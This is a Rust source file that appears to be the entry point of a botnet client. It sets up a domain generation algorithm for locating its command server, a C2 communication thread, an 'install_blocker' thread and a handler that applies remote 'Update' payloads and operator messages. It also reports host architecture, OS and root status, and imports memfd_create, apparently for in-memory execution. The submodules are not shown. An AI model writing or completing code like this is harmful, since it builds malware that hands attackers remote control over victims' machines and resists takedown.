use bytes::Bytes;
use chrono;
use dga::CharBot;
use message_handler::update;
use std::{
    fs::File,
    io::Write,
    os::fd::{AsRawFd, FromRawFd},
    path::PathBuf,
    sync::{Arc, RwLock},
};
use nix::unistd::Uid;

use std::thread;

use serde::{Deserialize, Serialize};

use std::env::consts::{ARCH, OS};

use nix::sys::memfd::{self, memfd_create, MemFdCreateFlag};
use std::ffi::CString;

mod arpa;
mod comm;
mod dga;
mod install_blocker;
mod message_handler;

pub const CERT: &[u8] = include_bytes!("../../../keys/cert.pem");

#[derive(Serialize, Deserialize, Debug, Clone)]
pub enum Status {
    Idle,
    Occupied(String),
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct SystemData {
    arch: String,
    os: String,
}

impl SystemData {
    pub fn new() -> Self {
        SystemData {
            arch: ARCH.to_string(),
            os: OS.to_string(),
        }
    }
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct Meta {
    version: u64,
    status: Status,
    installed_at: chrono::DateTime<chrono::Local>,
    system_data: SystemData,
    is_root: bool
}

impl Meta {
    pub fn new() -> Self {
        Self {
            version: 1,
            status: Status::Idle,
            installed_at: chrono::Local::now(),
            system_data: SystemData::new(),
            is_root: Uid::current().is_root()
        }
    }
}

pub type SharedMeta = Arc<RwLock<Meta>>;

fn main() {
    let shared_meta = Arc::new(RwLock::new(Meta::new()));

    let dga = Box::new(CharBot::default());

    let (comm, message_rx) = comm::Client::new(shared_meta, dga);

    let install_blocker_handle = thread::spawn(|| install_blocker::block());
    let comm_handle = thread::spawn(|| comm.main());

    loop {
        let message = message_rx.recv().unwrap();
        match message {
            comm::ClientMessage::Update(bytes) => (update(bytes)),
            comm::ClientMessage::Message(message) => (message_handler::handle_message(message)),
        }
    }
}
